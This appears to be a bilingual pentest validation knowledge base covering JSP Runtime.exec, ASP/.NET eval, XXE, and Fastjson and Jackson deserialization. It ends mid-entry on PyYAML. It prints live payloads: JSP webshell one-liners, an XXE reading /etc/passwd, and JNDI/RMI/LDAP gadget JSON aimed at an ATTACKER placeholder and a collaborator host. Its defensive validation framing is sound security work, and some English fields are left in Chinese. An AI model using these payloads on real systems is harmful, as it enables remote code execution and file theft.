description.en: Uses two JSP scriptlets to test whether user-controlled pages are compiled by a servlet container and whether request parameters reach Runtime.exec; the second also depends on Apache Commons IO to return process output.

prerequisites.zh: 隔离目标明确把测试文件映射到 JSP/Servlet 编译器，并可查看生成类与容器日志
prerequisites.en: The isolated target explicitly maps the test file to a JSP or servlet compiler, and generated classes and container logs are observable.

prerequisites.zh: 原始 cmd 参数替换为固定 marker-helper，且 Java 服务身份只能启动这一无副作用程序
prerequisites.en: The original cmd parameter is replaced by a fixed marker-helper, and the Java service identity can launch only this side-effect-free program.

title.zh: JSP Runtime.exec Scriptlet

description.zh: 原行仅作追溯；验证版本必须去除任意请求命令，只调用签名 marker-helper。第二行还需先确认 Commons IO 在应用类路径中。
description.en: 原行仅作追溯；验证版本必须去除任意请求命令，只调用签名 marker-helper。第二行还需先确认 Commons IO 在应用类路径中。

analysis.zh: 完整证据是目标 JSP 被容器编译，生成的 Servlet 以 Java 服务身份启动受控 marker-helper。页面可访问、JSP 标签被识别、编译异常或仅有固定文本均不足；第一行没有输出时必须有进程遥测。
analysis.en: Complete evidence is the target JSP being compiled by the container and its generated servlet launching the controlled marker-helper as the Java service identity. Page accessibility, recognized JSP tags, compilation errors, and fixed text alone are insufficient; the first line requires process telemetry because it returns no output.

opsecTips.zh: 只允许签名 marker-helper 且限制一次子进程；不得向 Runtime.exec 传入用户命令
opsecTips.en: Permit only the signed marker-helper and one child process; never pass a user command to Runtime.exec.

opsecTips.zh: 验证后删除 JSP、生成 Servlet/class、工作目录缓存和帮助程序，并确认 URL 失效
opsecTips.en: After validation delete the JSP, generated servlet or class, work-directory caches, and helper, and confirm the URL is gone.

title.zh: 确认 JSP 编译与类路径

description.zh: 记录页面映射、生成 Servlet、容器身份，并检查第二行所需 Commons IO。
description.en: Record page mapping, generated servlet, container identity, and the Commons IO dependency required by the second line.

title.zh: 固定 Helper 后单行请求
title.en: Request one line after pinning the helper

description.zh: 移除外部 cmd 参数，只保留一次 marker-helper 调用，并为请求绑定唯一令牌。
description.en: Remove external cmd input, retain one marker-helper invocation, and bind a unique token to the request.

attackChain.payload:
<%@ page import="java.io.*" %><% Process p=Runtime.getRuntime().exec(request.getParameter("cmd")); %>
<% response.getWriter().println(org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream())); %>

title.zh: 关联 Servlet 与子进程
title.en: Correlate the servlet and child process

description.zh: 匹配容器日志、生成类、父子 PID 和输出，排除静态返回或其他任务进程。
description.en: Match container logs, generated class, parent-child PIDs, and output while excluding static serving and unrelated jobs.

title.zh: 关闭 JSP 映射并清理
title.en: Disable JSP mapping and clean up

description.zh: 修复后重放静态上传和标记 JSP，确认用户内容不再编译，并删除生成类与帮助程序。
description.en: After remediation replay a static upload and marker JSP, confirm user content is no longer compiled, and delete generated classes and the helper.

overview.zh: JSP 首次请求通常会被翻译并编译为 Servlet。第一行启动进程但不回显，第二行读取子进程标准输出且依赖 Commons IO；两者属于同一 Java 运行时边界，不应与 ASP/.NET 混合。
overview.en: A JSP is normally translated and compiled into a servlet on first request. The first line starts a process without returning output, while the second reads child stdout and requires Commons IO; both share one Java runtime boundary and should not be mixed with ASP or .NET.

vulnerability.zh: 若用户可写内容进入可执行 JSP 路径，或业务 JSP 把请求参数交给 Runtime.exec，数据可跨越为 JVM 子进程。文件上传成功、JSP 源码可见或编译错误都不能证明进程创建。
vulnerability.en: If user-writable content reaches an executable JSP path or a business JSP passes request parameters to Runtime.exec, data can cross into a JVM child process. Upload success, visible JSP source, and compilation errors do not prove process creation.

exploitation.zh: 先部署只输出随机常量的 JSP 证明容器编译，再将 Runtime.exec 参数固定为一次性 marker-helper 并选择一行单次请求。阳性要求请求、生成 Servlet、Java 父进程、帮助程序子进程与标记输出关联；无回显的第一行需依赖进程审计。
exploitation.en: First deploy a JSP that prints only a random constant to prove container compilation, then pin Runtime.exec to a one-time marker-helper and request one line once. A positive correlates the request, generated servlet, Java parent, helper child, and marker output; the first nonreflective line requires process audit.

mitigation.zh: 上传和用户内容存储在 Web 根目录外且禁用 JSP 映射，不允许动态编译不可信页面；移除请求驱动的 Runtime.exec，使用固定 Java API，并限制容器子进程、文件与网络权限。
mitigation.en: Store uploads and user content outside the web root with JSP mapping disabled, prohibit dynamic compilation of untrusted pages, remove request-driven Runtime.exec, use fixed Java APIs, and restrict container child-process, file, and network permissions.

name.zh: ASP/.NET 进程与动态求值边界
name.en: ASP and .NET Process and Dynamic-Evaluation Boundary

description.zh: 使用两条 ProcessStartInfo 片段和两条 eval 形态验证 Microsoft Web 运行时是否将请求数据交给系统进程或动态脚本求值。
description.en: Uses two Process Start Info fragments and two eval forms to test whether a Microsoft web runtime passes request data into an operating-system process or dynamic script evaluation.

prerequisites.zh: 已确认具体处理器是 ASP.NET、JScript.NET 或其他支持对应语法的 Microsoft 服务端运行时
prerequisites.en: The exact handler is confirmed as ASP.NET, JScript.NET, or another Microsoft server runtime supporting the selected syntax.

prerequisites.zh: cmd.exe、PowerShell 和 eval 输入均替换为固定常量或 marker-helper，且应用池子进程可审计
prerequisites.en: cmd.exe, PowerShell, and eval inputs are replaced by a fixed constant or marker-helper, and application-pool child processes are auditable.

title.zh: ASP/.NET 进程与 Eval 片段
title.en: ASP and .NET Process and Eval Fragments

description.zh: 每行需先匹配实际语言和处理器；执行版本不得接受 cmd 参数，只允许固定标记输出。后两条不是标准 C# 语句，必须由已确认支持 eval 的动态运行时解释。
description.en: Match each line to the actual language and handler first; the execution version must accept no cmd input and may emit only a fixed marker. The final two are not standard C# statements and require a confirmed dynamic runtime that supports eval.

analysis.zh: 结论必须按运行时分层：编译/解析成功、服务端固定表达式求值、ProcessStartInfo 启动帮助程序是不同证据。后两条在标准 C# 中无效，只有目标动态宿主明确支持时才可测试，不能因字符串含 eval 就认定 RCE。
analysis.en: 结论必须按运行时分层：编译/解析成功、服务端固定表达式求值、Process Start Info 启动帮助程序是不同证据。后两条在标准 C# 中无效，只有目标动态宿主明确支持时才可测试，不能因字符串含 eval 就认定 RCE。

opsecTips.zh: 禁止启动原始 cmd.exe/PowerShell；进程型行只允许一次签名 marker-helper，eval 型行只返回常量
opsecTips.en: Do not launch the original cmd.exe or PowerShell; process lines may invoke one signed marker-helper and eval lines may return only a constant.

opsecTips.zh: 验证后删除页面、动态编译产物和帮助程序，回收应用池并确认无残留子进程
opsecTips.en: After validation delete pages, dynamic compilation artifacts, and the helper, recycle the application pool, and confirm no child remains.

title.zh: 按处理器分类四条语法
title.en: Classify all four forms by handler

description.zh: 记录扩展名、编译器/脚本宿主、语言版本和应用池身份，保留语法结果。
description.en: Record extension, compiler or script host, language version, and application-pool identity and preserve syntax results.

title.zh: 改写为固定标记后单行验证
title.en: Validate one line after rewriting to a fixed marker

description.zh: 去除请求命令和危险可执行文件，只提交与当前运行时匹配的一行。
description.en: Remove request commands and dangerous executables and submit only one line matching the current runtime.

title.zh: 区分求值与进程创建

description.zh: 关联服务端标记、处理器日志和父子 PID，明确动态表达式与系统进程的不同证据。
description.en: Correlate server marker, handler logs, and parent-child PIDs and distinguish dynamic expression evidence from OS process evidence.

title.zh: 移除动态入口并回收应用池
title.en: Remove dynamic entry points and recycle the pool

description.zh: 修复后重放静态内容与四个负向输入，确认不再求值或启动进程，并清理缓存。
description.en: After remediation replay static content and all four negative inputs, confirm no evaluation or process launch, and clear caches.

overview.zh: ProcessStartInfo 行属于 .NET 进程启动边界，eval 行依赖具体动态脚本宿主；它们共享 Microsoft Web 部署与应用池权限，但语法不能跨运行时互换。测试前必须用编译或解析结果确定每行归属。
overview.en: The Process Start Info lines exercise .NET process creation, while eval depends on a specific dynamic script host. They share Microsoft web deployment and application-pool permissions, but their syntax is not interchangeable across runtimes. Compilation or parsing must classify each line before testing.

vulnerability.zh: 若请求参数进入 ProcessStartInfo 参数拼接或服务端 eval，攻击者可从数据边界进入进程或动态代码。处理器映射、语言选择和应用池权限共同决定影响；语法错误、源码回显或 Base64 解码成功不证明执行。
vulnerability.en: 若请求参数进入 Process Start Info 参数拼接或服务端 eval，攻击者可从数据边界进入进程或动态代码。处理器映射、语言选择和应用池权限共同决定影响；语法错误、源码回显或 Base64 解码成功不证明执行。

exploitation.zh: 先按运行时编译或 lint 四行，只选择语法有效的一行并将外部输入替换为随机常量/marker-helper。记录处理器、应用池身份、父子 PID 与响应。阳性要求服务端求值固定标记或启动唯一帮助程序；客户端 eval 和错误差异排除。
exploitation.en: 先按运行时编译或 lint 四行，只选择语法有效的一行并将外部输入替换为随机常量/marker-helper。记录处理器、应用池身份、父子 PID 与响应。阳性要求服务端求值固定标记或启动唯一帮助程序；客户端 eval 和错误差异排除。

mitigation.zh: 移除请求驱动的 ProcessStartInfo 和服务端 eval，改用固定业务 API 与参数数组；上传/模板目录禁用动态处理器，应用池采用最小权限和进程启动限制。回归覆盖所有处理器映射。
mitigation.en: 移除请求驱动的 Process Start Info 和服务端 eval，改用固定业务 API 与参数数组；上传/模板目录禁用动态处理器，应用池采用最小权限和进程启动限制。回归覆盖所有处理器映射。

name.zh: XML 实体文件读取与带外探测
name.en: XML Entity File Read and Out-of-Band Probes

description.zh: 使用本地外部实体引用、实体消费节点和外部 DTD，验证 XML 解析器是否允许文件解析或带外网络加载。
description.en: Uses a local external entity declaration, an entity-consuming node, and an external DTD to test whether an XML parser permits file resolution or out-of-band network loading.

prerequisites.zh: 目标端点或异步任务实际解析 XML
prerequisites.en: The endpoint or asynchronous job actually parses XML.

prerequisites.zh: 隔离环境提供无敏感标记文件和自有 HTTPS/DNS 回连服务
prerequisites.en: The isolated environment provides a nonsensitive marker file and controlled HTTPS or DNS callback service.

title.zh: 本地实体与外部 DTD 片段
title.en: Local Entity and External DTD Fragments

description.zh: 前三行分别是声明、消费节点和外部 DTD 探针，需按目标 XML 结构组合；将系统文件和外部域替换为隔离标记资源。
description.en: The lines are a declaration, consuming node, and external-DTD probe and must be composed for the target XML structure; replace system files and external domains with isolated marker resources.

analysis.zh: 本地读取与带外 XXE 证据不同：前者依赖受控标记进入输出或文件审计，后者依赖一次性域与任务关联。通用解析错误不能确认任何一种。
analysis.en: In-band and out-of-band XXE require different evidence: marker output or file audit for the former, and a one-time domain correlated to the parse job for the latter. A generic parse error confirms neither.

opsecTips.zh: 将 `/etc/passwd` 和公共回连域替换为本地测试标记与自有一次性域。
opsecTips.en: Replace /etc/passwd and public callback domains with a local test marker and controlled one-time domain.

opsecTips.zh: 限制文档大小、实体数量与等待窗口，防止资源耗尽和长期回连监听。
opsecTips.en: Limit document size, entity count, and observation window to prevent resource exhaustion and long-lived listeners.

title.zh: 确认 XML 解析任务

description.zh: 定位同步或异步解析组件、输入架构和日志关联字段。
description.en: Identify the synchronous or asynchronous parser, input schema, and log-correlation field.

title.zh: 组合并提交受控实体文档
title.en: Compose and submit a controlled entity document

description.zh: 按目标架构组合声明与消费节点，或使用一次性外部 DTD，并替换为标记资源。
description.en: Compose declaration and consuming node for the target schema or use a one-time external DTD, replacing targets with markers.

attackChain.payload:
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
<!DOCTYPE foo SYSTEM "http://xpto.burpcollaborator.net/xpto.dtd">

title.zh: 关联文件或带外证据

description.zh: 匹配标记输出、文件审计或唯一回连与解析任务，排除应用其他组件请求。
description.en: Match marker output, file audit, or unique callback to the parse job, excluding requests from other application components.

title.zh: 关闭实体解析并回归

description.zh: 修复所有解析器后重放恶意与正常 XML，确认实体不解析且业务数据仍可处理。
description.en: After fixing every parser, replay malicious and normal XML to confirm no entity resolution while business data still parses.

overview.zh: 该三行原本被错误放在 WebShell 集合中，实际属于 XML 外部实体。第一行声明本地实体，第二行在业务节点消费它，第三行请求外部 DTD；应根据目标 XML 架构组合，不能把三行视为三个可独立执行命令。
overview.en: These lines were misplaced in a webshell collection and are XML external-entity probes. The first declares a local entity, the second consumes it in a business node, and the third requests an external DTD. Compose them for the target schema rather than treating them as standalone commands.

vulnerability.zh: 根因是解析器允许 DTD、外部通用实体或外部子集，并以应用权限访问文件或网络。异步文档处理器也可能在上传成功后才触发，因此证据必须关联实际解析任务，而非只看入口响应。
vulnerability.en: The cause is a parser allowing DTDs, external general entities, or external subsets with application filesystem or network privileges. An asynchronous document processor may trigger after upload, so evidence must correlate the real parse job rather than only the ingress response.

exploitation.zh: 先提交无 DOCTYPE 的合法 XML 基线，再用测试标记文件构造本地实体文档，或用一次性自有域构造外部 DTD。记录任务 ID、解析日志、文件访问与回连。标记输出或唯一回连才成立；500、上传成功和规则命中不是 XXE 证据。
exploitation.en: Submit valid XML without a DOCTYPE, then build a local-entity document using a test marker or an external-DTD document using a one-time controlled domain. Record job ID, parser logs, file access, and callbacks. Marker output or a unique callback is evidence; 500, upload success, or a rule hit is not.

mitigation.zh: 在所有同步与异步解析器禁用 DOCTYPE、外部实体、外部子集与 XInclude，采用安全预设并限制文件系统和出站网络。对 XML 派生格式采用同样策略，验证解析库配置并保留回显/盲 XXE 回归样例。
mitigation.en: Disable DOCTYPE, external entities, external subsets, and XInclude in every synchronous and asynchronous parser, use secure presets, and restrict filesystem and egress. Apply the same policy to XML-derived formats, verify parser configuration, and retain in-band and blind XXE regression cases.

name.zh: Fastjson InetAddress DNS 解析边界

description.zh: 使用 Inet4Address 与 Inet6Address 的 @type JSON 变体验证特定 Fastjson 配置是否实例化网络地址类型并由应用服务器发起 DNS 解析。
description.en: Uses Inet4Address and Inet6Address @type JSON variants to test whether a specific Fastjson configuration instantiates network-address types and causes application-origin DNS resolution.

subCategory.en: Fastjson Auto Type DNS Side Effect

prerequisites.zh: 已冻结 Fastjson 与 JDK 版本、AutoType 配置、解析入口和目标 Java 类型允许策略
prerequisites.en: Fastjson and JDK versions, Auto Type configuration, parser entry point, and Java-type allow policy are frozen.

prerequisites.zh: dnslog.cn 在执行前替换为自有一次性权威 DNS 名称，且应用与操作者解析流量可区分
prerequisites.en: dnslog.cn is replaced before execution with a controlled one-time authoritative DNS name, and application traffic is distinguishable from operator resolution.

title.zh: Inet4Address 与 Inet6Address JSON

description.zh: 原始第三方域只作追溯；分别替换为两个自有随机子域，每次解析一行并记录请求 ID、类型选择与权威 DNS 日志。
description.en: The original third-party domain is retained for traceability only; replace it with two controlled random subdomains, parse one line per request, and record request ID, selected type, and authoritative DNS logs.

analysis.zh: 可确认结果限于 Fastjson 在目标配置下选择 InetAddress 类型并触发应用源 DNS。仅 JSON 解析成功、域名出现在异常、公共 DNS 有记录或响应不同都不足；该结果不能被表述为反序列化 RCE。
analysis.en: A confirmed result is limited to Fastjson selecting an Inet Address type under the target configuration and triggering application-origin DNS. Successful JSON parsing, a domain in an exception, public-DNS records, or response differences are insufficient and must not be described as deserialization RCE.

opsecTips.zh: 每条只使用一次性自有 DNS 令牌并限制单次查询；首次应用源解析后停止
opsecTips.en: Use one controlled one-time DNS token per line and limit it to one query; stop after the first application-origin resolution.

opsecTips.zh: 测试后删除权威记录和令牌映射，清理包含域名与出口地址的临时日志
opsecTips.en: After testing delete authoritative records and token mappings and clean temporary logs containing domains and egress addresses.

title.zh: 冻结解析器与无查询基线
title.en: Freeze the parser and no-query baseline

description.zh: 记录 Fastjson/JDK 版本、AutoType 策略和普通 DTO 解析期间的 DNS 空白窗口。
description.en: Record Fastjson and JDK versions, Auto Type policy, and a DNS-quiet window during ordinary DTO parsing.

title.zh: 替换域名后逐类型解析
title.en: Replace domains and parse each type

description.zh: 为两条输入分别签发一次性域名并绑定不同请求 ID，不使用公共 dnslog 服务。
description.en: Issue a separate one-time domain and request ID for each input without using a public dnslog service.

attackChain.payload:
{"@type":"java.net.Inet4Address","val":"dnslog.cn"}
{"@type":"java.net.Inet6Address","val":"dnslog.cn"}

title.zh: 关联类型实例化与 DNS

description.zh: 匹配解析日志、线程、请求 ID、出口地址和权威查询，排除扫描器与客户端。
description.en: Match parser log, thread, request ID, egress address, and authoritative query while excluding scanners and clients.

title.zh: 限制 AutoType 并撤销域名
title.en: Restrict Auto Type and revoke domains

description.zh: 修复后重放 DTO 与两条 @type，确认业务解析保留且 DNS 不再发生，再删除测试记录。
description.en: After remediation replay the DTO and both @type inputs, preserve business parsing with no DNS, then delete test records.

overview.zh: Fastjson 的历史 AutoType 行为可能根据 @type 创建指定 Java 类；InetAddress 构造或解析可产生 DNS 副作用。这两行用于证明类型实例化与解析边界，不包含类加载或命令执行链。
overview.en: Historical Fastjson Auto Type behavior may instantiate a Java class named by @type, and Inet Address construction or parsing can produce a DNS side effect. These lines test type instantiation and resolution only and contain no class-loading or command-execution chain.

vulnerability.zh: 当不可信 JSON 可选择网络相关类型，解析器可能在业务校验前产生外部解析，造成盲副作用或成为更高风险 gadget 的前置条件。DNS 查询本身不能证明任意类实例化、JNDI 查找或 RCE。
vulnerability.en: When untrusted JSON can select network-capable types, parsing may cause external resolution before business validation, creating a blind side effect or a prerequisite for higher-risk gadgets. DNS alone proves neither arbitrary class instantiation, JNDI lookup, nor RCE.

exploitation.zh: 先用普通 DTO 建立无 DNS 基线，再为 IPv4/IPv6 各生成一个随机域并逐条解析。阳性要求 Fastjson 日志显示目标类型且权威 DNS 收到应用出口查询；操作者预解析、安全产品查询和缓存命中必须剔除。
exploitation.en: Establish a no-DNS baseline with an ordinary DTO, then issue one random domain each for IPv4 and IPv6 and parse them separately. A positive requires Fastjson logs to show the target type and authoritative DNS to receive an application-egress query; operator pre-resolution, security-product queries, and cache effects must be excluded.

mitigation.zh: 升级受支持 Fastjson 版本，关闭或严格允许 AutoType，反序列化到固定 DTO，并在网络层限制解析与出站。回归同时覆盖合法地址字段、未知 @type 和两个 InetAddress 类型。
mitigation.en: Upgrade to a supported Fastjson version, disable or strictly allowlist Auto Type, deserialize into fixed DT Os, and restrict DNS and egress at the network layer. Regress valid address fields, unknown @type values, and both Inet Address types.

name.zh: Fastjson JdbcRowSet JNDI 查找边界
name.en: Fastjson Jdbc Row Set JNDI-Lookup Boundary

description.zh: 使用 RMI 与 LDAP dataSourceName 的 JdbcRowSetImpl JSON 验证 Fastjson AutoType、setter 调用与 JNDI 网络查找是否形成可观察链。
description.en: Uses Jdbc Row Set Impl JSON with RMI and LDAP data Source Name values to test whether Fastjson Auto Type, setter invocation, and JNDI network lookup form an observable chain.

subCategory.en: Fastjson Jdbc Row Set JNDI Boundary

prerequisites.zh: 隔离环境固定 Fastjson/JDK 版本与 AutoType 策略，并确认解析入口会绑定属性 setter
prerequisites.en: The isolated environment pins Fastjson and JDK versions and Auto Type policy and confirms that the parser entry binds property setters.

prerequisites.zh: RMI/LDAP 地址改为只记录连接、不返回 Reference、对象或类字节的自有捕获器
prerequisites.en: RMI and LDAP addresses are replaced with controlled capture services that log connections but return no Reference, object, or class bytes.

title.zh: JdbcRowSetImpl RMI/LDAP JSON
title.en: Jdbc Row Set Impl RMI and LDAP JSON

description.zh: 把 ATTACKER 替换为隔离捕获器，一次只解析一个协议；捕获器必须立即关闭连接且不提供任何可加载内容。
description.en: Replace ATTACKER with an isolated capture service and parse one protocol at a time; the service must close immediately and provide no loadable content.

analysis.zh: 阳性仅证明目标 Fastjson/JDK 组合实例化 JdbcRowSetImpl、设置 dataSourceName/autoCommit 并发起应用源 RMI/LDAP 连接。没有 Reference、对象或类字节返回时，不能声称 JNDI 类加载或 RCE。
analysis.en: A positive proves only that the target Fastjson and JDK combination instantiated Jdbc Row Set Impl, set data Source Name and auto Commit, and initiated an application-origin RMI or LDAP connection. With no Reference, object, or class bytes returned, JNDI class loading and RCE cannot be claimed.

opsecTips.zh: 捕获器设置首包即断开和全局超时，禁止返回任何序列化对象、Reference 或远程类
opsecTips.en: Configure capture services to close after the first bytes with a global timeout and return no serialized object, Reference, or remote class.

opsecTips.zh: 完成后关闭两个端口、删除请求令牌并核对 JVM 没有类加载、线程残留或后续连接
opsecTips.en: Afterward close both ports, delete request tokens, and verify the JVM has no class load, residual thread, or follow-up connection.

title.zh: 建立无对象 JNDI 捕获器

description.zh: RMI 与 LDAP 监听器只记录来源、令牌和首包，绝不返回 Reference 或类数据。
description.en: RMI and LDAP listeners record only source, token, and first bytes and never return a Reference or class data.

title.zh: 逐协议解析 JdbcRowSet JSON
title.en: Parse Jdbc Row Set JSON per protocol

description.zh: 替换主机并为两条输入分配独立请求 ID，每个环境只执行一次。
description.en: Replace the host and assign distinct request IDs to both inputs, executing each environment only once.

attackChain.payload:
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://ATTACKER/Exploit","autoCommit":true}
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ATTACKER/a","autoCommit":true}

title.zh: 证明 Setter 到网络查找

description.zh: 关联 Fastjson 类型/setter 跟踪、解析线程与捕获器连接，并确认没有对象返回。
description.en: Correlate Fastjson type and setter traces, parser thread, and capture connection, and confirm that no object was returned.

title.zh: 阻断 AutoType 与 JNDI 出站
title.en: Block Auto Type and JNDI egress

description.zh: 修复后重放普通 DTO 和两条 JSON，确认无捕获连接并删除监听器与令牌。
description.en: After remediation replay the ordinary DTO and both JSON inputs, confirm no captured connection, and remove listeners and tokens.

overview.zh: JdbcRowSetImpl 的 dataSourceName 与 autoCommit 组合曾被用于触发 JNDI 数据源查找。原 JSON 只足以测试出站查找前提；安全验证不得返回远程对象、工厂类或字节码。
overview.en: The Jdbc Row Set Impl data Source Name and auto Commit combination has been used to trigger JNDI data-source lookup. The JSON is sufficient only to test outbound lookup prerequisites; safe validation must return no remote object, factory class, or bytecode.

vulnerability.zh: 如果 Fastjson 允许实例化该类并调用相关 setter，解析不可信 JSON 可能在业务逻辑前触发 RMI/LDAP。后续影响受 JDK 信任限制、类路径和网络控制约束；建立连接并不等于类加载或代码执行。
vulnerability.en: If Fastjson permits this class and invokes the relevant setters, parsing untrusted JSON may trigger RMI or LDAP before business logic. Further impact depends on JDK trust restrictions, classpath, and network controls; a connection does not equal class loading or code execution.

exploitation.zh: 先用同结构但普通类型的 JSON 建立无连接基线，再把 RMI/LDAP 各指向独立随机端口并单次解析。阳性要求解析线程与捕获器连接关联；捕获器不响应对象内容。超时、DNS、异常提到 URL 或测试客户端连接都不是完整查找。
exploitation.en: Establish a no-connection baseline using the same shape with an ordinary type, then point RMI and LDAP to separate random capture ports and parse once each. A positive correlates the parser thread with a capture connection while the service returns no object content. Timeout, DNS, a URL in an exception, or a test-client connection is not a complete lookup.

mitigation.zh: 升级 Fastjson，关闭或精确允许 AutoType，绑定固定 DTO；限制应用到 RMI/LDAP 端口的出站，并采用受支持 JDK 安全默认值。回归应确认普通 DTO 正常且两个捕获器均无连接。
mitigation.en: Upgrade Fastjson, disable or precisely allowlist Auto Type, and bind fixed DT Os; block application egress to RMI and LDAP and use supported JDK security defaults. Regression should preserve ordinary DT Os with no connection to either capture service.

name.zh: Jackson 多态类型网络副作用边界

description.zh: 使用 JEditorPane HTTP 页面与 JdbcRowSet RMI 数据源两个数组式多态 JSON，验证 Jackson 默认类型配置是否允许网络能力类型产生出站副作用。
description.en: Uses array-form polymorphic JSON for a J Editor Pane HTTP page and Jdbc Row Set RMI data source to test whether Jackson default typing permits network-capable types to produce outbound side effects.

subCategory.zh: Jackson 多态反序列化网络边界

prerequisites.zh: 已冻结 Jackson/JDK 版本、ObjectMapper 默认类型设置、允许类型验证器和解析目标类型
prerequisites.en: Jackson and JDK versions, Object Mapper default-typing settings, polymorphic type validator, and declared target type are frozen.

prerequisites.zh: HTTP 与 RMI 目标改为自有首包捕获器，既不提供 class 文件也不返回远程对象
prerequisites.en: HTTP and RMI targets are replaced with controlled first-packet capture services that provide neither class files nor remote objects.

title.zh: JEditorPane 与 JdbcRowSet 多态 JSON
title.en: J Editor Pane and Jdbc Row Set Polymorphic JSON

description.zh: 将 ATTACKER 分别替换为隔离 HTTP/RMI 捕获器；每次只解析一个类型，服务端不返回 class、对象或可执行内容。
description.en: Replace ATTACKER with isolated HTTP and RMI capture services respectively, parse one type at a time, and return no class, object, or executable content.

analysis.zh: 可证结论是 Jackson 在目标设置下接受网络能力类型并产生应用源 HTTP 或 RMI 连接。捕获器不返回 class/object，因此不能声称远程类加载、反序列化 gadget 完成或 RCE；错误和 DNS 只是诊断信号。
analysis.en: The supportable conclusion is that Jackson accepted a network-capable type under the target settings and produced an application-origin HTTP or RMI connection. Because capture services return no class or object, remote class loading, a completed gadget, and RCE cannot be claimed; errors and DNS are diagnostic only.

opsecTips.zh: 捕获器只接收首包并立即断开，禁止托管 Exploit.class、RMI 对象或重定向
opsecTips.en: Capture only the first packet and disconnect immediately; never host Exploit.class, RMI objects, or redirects.

opsecTips.zh: 测试后关闭 HTTP/RMI 端口、清除 token 与连接日志，并核对 JVM 无新增类或线程
opsecTips.en: After testing close HTTP and RMI ports, clear tokens and connection logs, and verify no new JVM class or thread remains.

title.zh: 记录 ObjectMapper 类型策略

description.zh: 保存默认类型、验证器、声明基类、JDK 模块和固定 DTO 的无连接结果。
description.en: Preserve default typing, validator, declared base type, JDK modules, and the fixed DTO's no-connection result.

title.zh: 逐类型连接空响应捕获器
title.en: Connect each type to an empty-response capture service

description.zh: HTTP 与 RMI 使用不同令牌和端口，单次解析且不提供任何响应对象。
description.en: Use distinct tokens and ports for HTTP and RMI, parse once, and provide no response object.

attackChain.payload:
["javax.swing.JEditorPane",{"page":"http://ATTACKER/Exploit.class"}]
["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"rmi://ATTACKER/Exploit","autoCommit":true}]

title.zh: 关联类型、Setter 与 Socket

description.zh: 匹配 Jackson 跟踪、解析线程、目标属性和首包日志，限定为网络副作用。
description.en: Match Jackson traces, parser thread, target property, and first-packet log and limit the finding to a network side effect.

title.zh: 收紧类型验证并清理
title.en: Constrain type validation and clean up

description.zh: 修复后重放 DTO 与两个多态输入，确认类型在连接前拒绝，再关闭捕获器。
description.en: After remediation replay the DTO and both polymorphic inputs, confirm type rejection before connection, and close capture services.

overview.zh: Jackson 数组式多态表示可在启用默认类型时携带具体类名。JEditorPane 的 page 属性和 JdbcRowSet 的 dataSourceName 具有网络副作用，但是否可实例化取决于版本、类型验证器、模块可见性和 JDK。
overview.en: Jackson array-form polymorphism can carry a concrete class name when default typing is enabled. J Editor Pane page and Jdbc Row Set data Source Name can have network side effects, but instantiation depends on version, type validator, module visibility, and JDK.

vulnerability.zh: 不可信 JSON 若能选择任意多态类型，解析器可能调用具有 I/O 副作用的 setter。出站 HTTP/RMI 证明类型边界过宽，但在捕获器不返回内容时不能推导类执行；类型被拒绝或模块不可访问是阴性。
vulnerability.en: If untrusted JSON can select arbitrary polymorphic types, the parser may invoke setters with I/O side effects. Outbound HTTP or RMI proves an overly broad type boundary but does not imply class execution when capture services return no content; rejected types or inaccessible modules are negative results.

exploitation.zh: 以固定 DTO 和禁用默认类型建立无连接基线，再逐条指向不同捕获器并记录类型解析、setter、线程和 socket。阳性要求同一请求的目标 setter 与应用源连接关联；错误中出现类名、DNS 或预加载类不计。
exploitation.en: Establish a no-connection baseline with a fixed DTO and default typing disabled, then point each line to a separate capture service and record type resolution, setter, thread, and socket. A positive correlates the target setter and application-origin connection in one request; class names in errors, DNS alone, or preloaded classes do not count.

mitigation.zh: 禁用不需要的默认类型，使用 PolymorphicTypeValidator 精确允许业务类型，绑定固定 DTO 并升级受支持 Jackson/JDK。网络层阻断应用到任意 HTTP/RMI 目标，回归覆盖两个输入。
mitigation.en: Disable unnecessary default typing, precisely allow business types with Polymorphic Type Validator, bind fixed DT Os, and upgrade supported Jackson and JDK versions. Block arbitrary application HTTP and RMI egress and regress both inputs.

name.zh: PyYAML Object/Apply 不安全加载边界

description.zh: 使用一条 `!!python/object/apply` 输入验证目标 PyYAML 版本与 Loader 是否允许构造 subprocess.check_output 调用，并以无副作用帮助程序限定证据。
description.en: Uses one !!python/object/apply input to test whether the target Py YAML version and Loader permit construction of a subprocess.check_output call, with evidence constrained to a side-effect-free helper.

prerequisites.zh: 已冻结 Python、PyYAML 版本和实际 Loader 调用，并确认输入完整进入 YAML 解析器
prerequisites.en: Python and Py YAML versions and the actual Loader call are frozen, and input is confirmed to reach the YAML parser intact.

prerequisites.zh: 原始 cat 命令替换为只输出一次性随机标记的固定帮助程序，且进程创建可审计
prerequisites.en: The original cat command is replaced with a fixed helper that only prints a one-time random marker, and process creation is auditable.

title.zh: PyYAML Object/Apply 输入

description.zh: 危险原行仅作来源记录；执行前把参数数组替换为签名 marker-helper，禁止读取 /etc/passwd 或运行任意命令。
description.en: The dangerous original is retained only for source traceability; replace its argument array with the signed marker-helper before execution and never read /etc/passwd or run an arbitrary command.

analysis.zh: 完整阳性是目标不安全 Loader 处理该标签并由 Python 父进程启动受控 marker-helper，输出与请求令牌一致。YAML 可解析、标签出现在异常、subprocess 模块已导入或安全 Loader 拒绝都不能证明执行。
analysis.en: A complete positive is the target unsafe Loader processing the tag and the Python parent launching the controlled marker-helper with output matching the request token. Parseable YAML, a tag in an exception, an imported subprocess module, or rejection by a safe Loader does not prove execution.

opsecTips.zh: 只允许签名 marker-helper 且限制为一次子进程；出现文件读取、网络连接或其他可执行文件立即停止
opsecTips.en: Allow only the signed marker-helper and one child process; stop immediately on a file read, network connection, or any other executable.

opsecTips.zh: 测试后删除帮助程序、YAML 样例和进程审计导出，销毁隔离虚拟环境并轮换令牌
opsecTips.en: After testing delete the helper, YAML sample, and process-audit export, destroy the isolated virtual environment, and rotate the token.

title.zh: 记录 Loader 与安全基线
title.en: Record the Loader and safe baseline

description.zh: 保存依赖版本、加载 API、普通 YAML 结果和 safe_load 对 Python 标签的拒绝证据。
description.en: Preserve dependency version, load API, ordinary YAML result, and evidence that safe_load rejects the Python tag.

title.zh: 替换为 Marker Helper 后解析
